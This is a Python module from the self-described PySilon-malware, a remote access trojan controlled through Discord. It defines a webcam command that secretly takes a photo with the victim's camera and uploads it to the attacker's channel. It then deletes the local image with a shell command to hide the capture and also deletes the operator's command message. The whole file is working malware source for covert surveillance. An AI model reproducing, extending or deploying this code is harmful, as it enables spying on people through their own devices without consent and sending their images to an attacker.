import pygame.camera
import pygame.image
import subprocess
import time
import sys
import os
import resources.modules.misc as pysilon_misc

@client.command(name="webcam")
async def webcam(ctx, action=None, camera_index=None):
    await ctx.message.delete()
    if action == "photo":
        pygame.camera.init()
        if camera_index != None: 
            camera_index = int(camera_index)
        else: camera_index = 0
        try:
            camera = pygame.camera.Camera(camera_index)
            camera.start()
        except: 
            return await ctx.send('```❗ Camera with index ' + str(camera_index) + ' was not found.```')
        time.sleep(1)
        image = camera.get_image()
        pygame.image.save(image, f'{os.path.dirname(sys.executable)}\\webcam.png')
        camera.stop()
        await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'{os.path.dirname(sys.executable)}\\webcam.png'))
        subprocess.run(f'del /s {os.path.dirname(sys.executable)}\\webcam.png', shell=True)
    elif action == "video":
        pass # todo
    else:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .webcam <action> <camera_index (default: 0)>\nActions:\n    photo - take a photo with target PC\'s webcam```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)